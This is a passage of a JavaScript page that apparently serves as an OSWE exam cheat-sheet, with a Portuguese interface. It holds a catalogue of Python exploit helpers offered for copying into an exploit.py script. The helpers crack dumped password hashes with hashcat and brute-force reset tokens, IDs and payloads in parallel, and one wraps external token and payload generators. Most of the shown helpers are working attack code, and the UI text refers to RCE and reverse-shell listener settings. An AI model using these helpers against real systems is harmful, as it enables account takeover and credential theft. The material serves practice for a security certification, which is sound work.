raw   -> \"aaa\\nbbb\\n\"\n    #   lines -> [\"aaa\", \"bbb\"]\n    #   first -> \"aaa\"\n    #   json  -> json.loads(stdout)\n    #\n    # examples:\n    # run_external([\"php\", \"token.php\", str(start_ms), str(stop_ms)], timeout=60, mode=\"lines\")\n    # run_external([\"java\", \"CreateToken\", str(start_ms), str(stop_ms), str(user_id)], mode=\"lines\")\n    # run_external([\"node\", \"payload.js\", \"admin\"], mode=\"json\")\n    # run_external([\"./helper\", \"arg1\"], mode=\"first\")\n    print(\"[*] running:\", \" \".join(map(str, cmd)))\n\n    out = subprocess.run(\n        [str(x) for x in cmd],\n        text=True,\n        capture_output=True,\n        timeout=timeout,\n    )\n    if out.stderr:\n        print(\"[stderr]\", out.stderr[:1000])\n\n    if out.returncode != 0:\n        print(\"[stdout]\", out.stdout[:1000])\n        raise RuntimeError(\"external command failed: \" + \" \".join(map(str, cmd)))\n\n    if mode == \"raw\":\n        return out.stdout\n\n    if mode == \"lines\":\n        return [line.strip() for line in out.stdout.splitlines() if line.strip()]\n\n    if mode == \"first\":\n        for line in out.stdout.splitlines():\n            line = line.strip()\n            if line:\n                return line\n        return None\n\n    if mode == \"json\":\n        import json\n        return json.loads(out.stdout)\n\n    raise ValueError(\"mode must be raw, lines, first, or json\")\n"},{"id":"helper-hashcat-crack","title":"Helper - hashcat crack","category":"Helpers","kind":"function","functionName":"crack_hash_hashcat","call":"password = crack_hash_hashcat(hash_value, mode='1400')","summary":"Runs hashcat against one hash, with optional base64-to-hex normalization and best-effort verification.","useWhen":"You dumped a password hash through SQLi/file read and want to crack it from exploit.py.","editFirst":["wordlist","mode","input_format","timeout"],"aliases":["hashcat","rockyou","SHA1","SHA256","base64 hash","hex hash","crack","mode 1400"],"code":"def crack_hash_hashcat(hash_value, wordlist=\"/usr/share/wordlists/rockyou.txt\", mode=\"1400\", input_format=\"auto\", timeout=300):\n    import base64\n    import hashlib\n    import os\n    import re\n    import subprocess\n    import tempfile\n\n    # Use when: you dumped a hash and hashcat is available locally.\n    # Edit first: mode and wordlist. Common modes: 0=MD5, 100=SHA1, 1400=SHA256, 1700=SHA512.\n    hash_value = hash_value.strip()\n\n    def to_hex(value):\n        if input_format == \"hex\":\n            return value.lower()\n        if input_format == \"base64\":\n            return base64.b64decode(value).hex()\n        if re.fullmatch(r\"[0-9a-fA-F]+\", value) and len(value) % 2 == 0:\n            return value.lower()\n        try:\n            return base64.b64decode(value, validate=True).hex()\n        except Exception:\n            return value.lower()\n\n    hex_hash = to_hex(hash_value)\n    print(\"[*] hash input:\", hash_value)\n    print(\"[*] hash hex:\", hex_hash)\n\n    fd, hash_file = tempfile.mkstemp(suffix=\".hash\")\n    os.close(fd)\n    try:\n        with open(hash_file, \"w\", encoding=\"utf-8\") as f:\n            f.write(hex_hash + \"\\n\")\n\n        result = subprocess.run(\n            [\"hashcat\", \"-m\", str(mode), hash_file, wordlist, \"--quiet\", \"--potfile-disable\"],\n            text=True,\n            capture_output=True,\n            timeout=timeout,\n        )\n    finally:\n        try:\n            os.unlink(hash_file)\n        except OSError:\n            pass\n\n    if result.stderr:\n        print(\"[hashcat stderr]\", result.stderr[:1000])\n\n    for line in result.stdout.splitlines():\n        if \":\" not in line:\n            continue\n        left, plaintext = line.split(\":\", 1)\n        if left.lower() != hex_hash:\n            continue\n        print(\"[+] cracked:\", plaintext)\n\n        verify = {\n            \"0\": \"md5\", \"100\": \"sha1\", \"1400\": \"sha256\", \"1700\": \"sha512\",\n            \"10800\": \"sha384\", \"17400\": \"sha3_256\", \"17500\": \"sha3_384\", \"17600\": \"sha3_512\",\n        }.get(str(mode))\n        if verify:\n            ok = hashlib.new(verify, plaintext.encode()).hexdigest() == hex_hash\n            print(\"[+] verify:\", \"OK\" if ok else \"MISMATCH\")\n        return plaintext\n\n    print(\"[-] no hashcat match\")\n    return None\n"},{"id":"helper-try-candidates","title":"Helper - try candidates","category":"Helpers","kind":"function","functionName":"try_candidates","call":"hit = try_candidates(candidates, try_one)","summary":"Runs try_one(candidate) over any candidate list until something works.","useWhen":"You have tokens, IDs, paths, usernames, hosts, payloads or wordlist lines and want to test them one by one.","editFirst":["candidates","try_one(candidate)","stop_on_hit"],"aliases":["candidate runner","tokens","wordlist","paths","IDs","payloads","stop_on_hit","for each"],"code":"def try_candidates(candidates, try_one, stop_on_hit=True, delay=0):\n    import time\n\n    # candidates can be tokens, paths, IDs, usernames, hosts, payloads, etc.\n    # try_one(candidate) must return a truthy value when candidate works.\n    # reset example:\n    #   def try_one(token):\n    #       r = session.post(url(cfg, \"/reset\"), data={\"token\": token, \"password\": cfg.password}, timeout=cfg.timeout)\n    #       return token if r.status_code in (200, 302) and \"invalid\" not in r.text.lower() else None\n    hits = []\n\n    for index, candidate in enumerate(candidates, 1):\n        print(f\"[*] trying {index}: {candidate}\")\n        try:\n            hit = try_one(candidate)\n        except Exception as e:\n            print(f\"[!] error for {candidate}: {e}\")\n            hit = None\n\n        if hit:\n            print(\"[+] hit:\", hit)\n            if stop_on_hit:\n                return hit\n            hits.append(hit)\n\n        if delay:\n            time.sleep(delay)\n\n    return hits if not stop_on_hit else None\n"},{"id":"helper-try-candidates-parallel","title":"Helper - try candidates parallel","category":"Helpers","kind":"function","functionName":"try_candidates_parallel","call":"hit = try_candidates_parallel(candidates, try_one, workers=20)","summary":"Runs try_one(candidate) over any candidate list in parallel until a hit appears.","useWhen":"Same as try_candidates, but for bigger lists where speed matters.","editFirst":["candidates","try_one(candidate)","workers"],"aliases":["candidate runner","parallel","ThreadPoolExecutor","tokens","wordlist","paths","IDs","payloads","SSRF hosts"],"code":"def try_candidates_parallel(candidates, try_one, workers=20, progress_every=50):\n    import threading\n    from concurrent.futures import ThreadPoolExecutor, as_completed\n\n    # candidates can be tokens, paths, IDs, usernames, hosts, payloads, etc.\n    # try_one(candidate) must return a truthy value when candidate works.\n    items = list(candidates)\n    found = threading.Event()\n\n    def wrapped(candidate):\n        if found.is_set():\n            return None\n        try:\n            hit = try_one(candidate)\n        except Exception as e:\n            print(f\"[!] error for {candidate}: {e}\")\n            return None\n        if hit:\n            found.set()\n            return hit\n        return None\n\n    with ThreadPoolExecutor(max_workers=workers) as ex:\n        futures = [ex.submit(wrapped, candidate) for candidate in items]\n        for done, fut in enumerate(as_completed(futures), 1):\n            hit = fut.result()\n            if hit:\n                print(\"[+] hit:\", hit)\n                return hit\n            if progress_every and done % progress_every == 0:\n                print(f\"[*] checked {done}/{len(items)}\")\n\n    return None\n"},{"id":"helper-save-lines","title":"Helper - append lines to file","category":"Helpers","kind":"function","functionName":"append_lines","call":"append_lines('tokens.txt', tokens)","summary":"Escreve lista/strings uma por linha.","useWhen":"Tokens candidatos, dumps, ffuf wordlist, usernames.","editFirst":["filename"],"aliases":["write file","tokens.txt","newline","append","with open"],"code":"def append_lines(filename, values):\n    with open(filename, \"a\", encoding=\"utf-8\") as f:\n        if isinstance(values, (list, tuple, set)):\n            for value in values:\n                f.write(str(value) + \"\\n\")\n        else:\n            f.write(str(values) + \"\\n\")\n    print(\"[+] appended\", filename)\n"}];
var selectedCategory = "All";
var activeId = "base-exploit-py";
var query = "";

function $(sel){ return document.querySelector(sel); }
function esc(s){ return String(s == null ? "" : s).replace(/[&<>"']/g, function(c){ return {"&":"&amp;","<":"&lt;",">":"&gt;","\"":"&quot;","'":"&#39;"}[c]; }); }
function norm(s){ return String(s || "").toLowerCase(); }
function entry(id){ return ENTRIES.find(function(e){ return e.id === id; }) || ENTRIES[0]; }
function setStatus(msg){ $("#status").textContent = msg || ""; }
function signature(e){
  if (e.kind === "base") return "script base";
  var m = e.code.match(new RegExp("def\\s+" + e.functionName + "\\s*\\(([^)]*)\\)"));
  return m ? e.functionName + "(" + m[1].trim() + ")" : e.functionName + "(...)";
}
function paramsInfo(e){
  var sig = signature(e);
  if (e.kind === "base") return "cfg + session criados no main()";
  var m = sig.match(/\((.*)\)/);
  var params = m && m[1].trim() ? m[1].split(",").map(function(x){ return x.trim(); }) : [];
  if (!params.length) return "sem args";
  return params.map(function(p){
    if (p === "session") return "session: requests.Session com cookies/proxy";
    if (p === "cfg") return "cfg: args --target/--proxy/--debug";
    if (/cmd/.test(p)) return p + ": comando a executar";
    if (/text/.test(p)) return p + ": resposta/texto para parse";
    if (/start|stop/.test(p)) return p + ": timestamp ms/window";
    return p;
  }).join("; ");
}
function outputInfo(e){
  if (e.kind === "base") return "cria cfg/session e main vazio";
  if (/run_|cmd|rce|shell/i.test(e.functionName)) return "executa/gera RCE; normalmente imprime output";
  if (/dump|extract|read/i.test(e.functionName)) return "devolve/imprime dado extraido";
  if (/login|auth|token|forge/i.test(e.functionName)) return "prepara auth/token para proximos requests";
  if (/build_/i.test(e.functionName)) return "devolve payload/body para usares noutro request";
  if (/start_/i.test(e.functionName)) return "arranca listener/servidor local";
  return "devolve response/payload conforme codigo";
}
function notesInfo(e){
  var notes = [];
  var code = e.code;
  if (/session\./.test(code)) notes.push("usa a mesma session; cookies seguem automaticamente");
  if (/server_url\(|require_server|cfg\.server_host|cfg\.server_port/.test(code)) notes.push("precisa --server-host/--server-port");
  if (/callback_url\(|require_callback|cfg\.lhost|cfg\.lport/.test(code)) notes.push("precisa --lhost/--lport");
  if (/websocket/.test(code)) notes.push("pode precisar: pip install websocket-client");
  if (/allow_redirects=True/.test(code)) notes.push("segue redirects");
  if (/AUTH_MODE|auth=/.test(code)) notes.push("confirma auth: session/basic/none");
  if (/TRUE_MARKER|MARKER_REGEX/.test(code)) notes.push("marker errado = falso negativo");
  if (/SLEEP|pg_sleep|WAITFOR|DELAY_SECONDS/.test(code)) notes.push("calibra timeout/baseline");
  if (/srand|currentTimeMillis|seed_ms|start_ms|stop_ms/.test(code)) notes.push("janela ms grande = mais tokens");
  if (/PATH|PARAM|BODY_TEMPLATE|PAYLOAD/.test((e.editFirst || []).join(" "))) notes.push("começa por colar request Burp e só depois generaliza");
  return notes.length ? notes.join("; ") : "sem dependencias especiais";
}
function aliasesHtml(e){
  var aliases = (e.aliases || []).slice(0, 12);
  return aliases.length ? '<div class="alias-list">' + aliases.map(function(a){ return '<span class="alias">' + esc(a) + '</span>'; }).join("") + '</div>' : "sem aliases";
}
function searchBlob(e){ return norm([e.id,e.title,e.category,e.kind,e.functionName,e.call,e.summary,e.useWhen,signature(e),paramsInfo(e),outputInfo(e),notesInfo(e),(e.editFirst||[]).join(" "),(e.aliases||[]).join(" "),e.code].join(" ")); }
function searchEntries(q, cat){
  q = norm(q);
  cat = cat || selectedCategory;
  return ENTRIES.filter(function(e){
    if (cat !== "All" && e.category !== cat) return false;
    return !q || searchBlob(e).indexOf(q) !== -1;
  });
}
function highlighted(code){
  var out = esc(code);
  out = out.replace(/^(\s*#.*)$/gm, '<span class="py-cmt">$1</span>');
  out = out.replace(/\b(def|return|if|else|elif|for|in|while|import|from|as|None|True|False|try|except|with|class|lambda|or|and|not)\b/g, '<span class="py-kw">$1</span>');
  out = out.replace(/\b(print|len|range|str|int|dict|list|set|isinstance|open|bytes|any|all|next|enumerate)\b/g, '<span class="py-bi">$1</span>');
  out = out.replace(/\bdef\s+([A-Za-z_][A-Za-z0-9_]*)/g, 'def <span class="py-fn">$1</span>');
  out = out.replace(/^(.+?# EDIT.*)$/gm, '<span class="edit">$1</span>');
  return out;
}
async function copyText(text){
  text = String(text == null ? "" : text);
  var buf = $("#copy-buf");
  if (buf) {
    buf.value = text;
    buf.classList.remove("show-copy");
    buf.setAttribute("aria-hidden", "true");
    buf.focus();
    buf.select();
    if (buf.setSelectionRange) buf.setSelectionRange(0, buf.value.length);
    try{
      if (document.execCommand("copy")){
        setStatus("copiado");
        return true;
      }
    }catch(e){}
  }
  try{
    if (navigator.clipboard && window.isSecureContext){
      await navigator.clipboard.writeText(text);
      setStatus("copiado");
      return true;
    }
  }catch(e){}
  if (!buf) {
    setStatus("copy falhou");
    return false;
  }
  buf.classList.add("show-copy");
  buf.removeAttribute("aria-hidden");
  buf.focus();
  buf.select();
  if (buf.setSelectionRange) buf.setSelectionRange(0, buf.value.length);
  setStatus("clipboard bloqueado: Ctrl+C na caixa em baixo");
  return false;
}
function editText(e){ return (e.editFirst || []).map(function(x){ return x + "  # EDIT"; }).join("\n") || "# no edit knobs"; }
function functionPlusCall(e){
  if (e.kind === "base") return e.code;
  return e.code.trim() + "\n\n# call inside main():\n" + e.call + "\n";
}
function renderChips(){
  $("#chips").innerHTML = CATEGORIES.map(function(c){
    return '<button class="chip" data-cat="' + esc(c) + '" aria-selected="' + String(c === selectedCategory) + '">' + esc(c) + '</button>';
  }).join("");
  $("#chips").querySelectorAll("button").forEach(function(btn){
    btn.addEventListener("click", function(){ selectedCategory = btn.dataset.cat; render(); });
  });
}
function renderList(){
  var rows = searchEntries(query);
  $("#count").textContent = rows.length + " funcs";
  $("#list").innerHTML = rows.map(function(e){
    return '<button class="row" data-id="' + esc(e.id) + '" aria-selected="' + String(e.id === activeId) + '">' +
      '<b>' + esc(e.functionName || e.title) + '</b><small>' + esc(e.category + " / " + e.kind) + '</small><small>' + esc(e.summary) + '</small></button>';
  }).join("") || '<div class="empty">sem resultados. procura termo que esteja no titulo ou codigo.</div>';
  $("#list").querySelectorAll("button").forEach(function(btn){
    btn.addEventListener("click", function(){ activeId = btn.dataset.id; renderDetail(); setStatus("view " + activeId); });
  });
}
function renderDetail(){
  var e = entry(activeId);
  $("#active-kind").textContent = e.category + " / " + e.kind;
  $("#detail").innerHTML =
    '<h3>' + esc(e.title) + '</h3>' +
    '<div class="sub">' + esc(e.summary) + '</div>' +
    '<div class="meta">' +
      '<div class="box"><b>quando usar</b>' + esc(e.useWhen) + '</div>' +
      '<div class="box"><b>editar primeiro</b>' + esc((e.editFirst || []).join(", ") || "nada") + '</div>' +
    '</div>' +
    '<details class="practical">' +
      '<summary>detalhes praticos</summary>' +
      '<div class="practical-body">' +
        '<div class="box"><b>como encaixa no exploit.py</b>Cola a funcao acima do <code>main()</code>. Depois chama no <code>main()</code> nesta ordem do teu chain.</div>' +
        '<div class="info-grid">' +
          '<div class="info"><b>assinatura</b><code>' + esc(signature(e)) + '</code></div>' +
          '<div class="info"><b>inputs</b>' + esc(paramsInfo(e)) + '</div>' +
          '<div class="info"><b>saida / efeito</b>' + esc(outputInfo(e)) + '</div>' +
        '</div>' +
        '<div class="box"><b>atencao pratica</b><span class="warn">' + esc(notesInfo(e)) + '</span></div>' +
        '<div class="box"><b>aliases / procura</b>' + aliasesHtml(e) + '</div>' +
      '</div>' +
    '</details>' +
    '<div class="call">' + esc(e.call) + '</div>' +
    '<div class="buttons">' +
      '<button class="primary" data-copy="function">copiar funcao</button>' +
      '<button data-copy="call">copiar chamada</button>' +
      '<button data-copy="both">funcao + chamada</button>' +
      '<button data-copy="edit">copiar EDIT</button>' +
    '</div>';
  $("#code").innerHTML = highlighted(e.code);
}
function handleDetailClick(ev){
  var btn = ev.target && ev.target.closest ? ev.target.closest("button[data-copy]") : null;
  if (!btn) return;
  var e = entry(activeId);
  var mode = btn.dataset.copy;
  if (mode === "function") copyText(e.code);
  if (mode === "call") copyText(e.call);
  if (mode === "both") copyText(functionPlusCall(e));
  if (mode === "edit") copyText(editText(e));
}
function render(){
  renderChips();
  renderList();
  renderDetail();
}
function boot(){
  $("#search").addEventListener("input", function(ev){ query = ev.target.value; renderList(); });
  $("#detail").addEventListener("click", handleDetailClick);
  render();
}
function renderFallback(err){
  var app = $("#app") || document.body;
  app.className = "fallback";
  app.innerHTML = '<h1>OSWE v5 fallback</h1><p>Boot falhou: ' + esc(err && err.message ? err.message : err) + '</p>' +
    ENTRIES.map(function(e){ return '<article><h2>' + esc(e.title) + '</h2><p>' + esc(e.summary) + '</p><pre>' + esc(e.code) + '</pre></article>'; }).join("");
}
try{ boot(); }catch(e){ renderFallback(e); }
